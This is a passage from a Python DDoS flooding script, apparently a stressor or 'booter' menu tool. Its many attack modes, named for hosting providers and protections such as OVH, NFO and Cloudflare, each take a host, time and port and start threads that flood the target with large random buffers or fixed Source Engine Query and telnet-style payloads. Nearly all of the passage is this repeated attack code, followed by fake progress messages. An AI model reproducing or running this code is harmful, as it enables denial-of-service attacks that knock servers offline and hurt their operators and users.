					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65337
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 995500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfokill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee....")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee...")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee..")
					time.sleep(1)
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
					print("\033[85m[INFO] Floading Sent Successfully")
					time.sleep(3)
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhtcp":
			try:
				if running >= 20000:
					print("\033[85mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
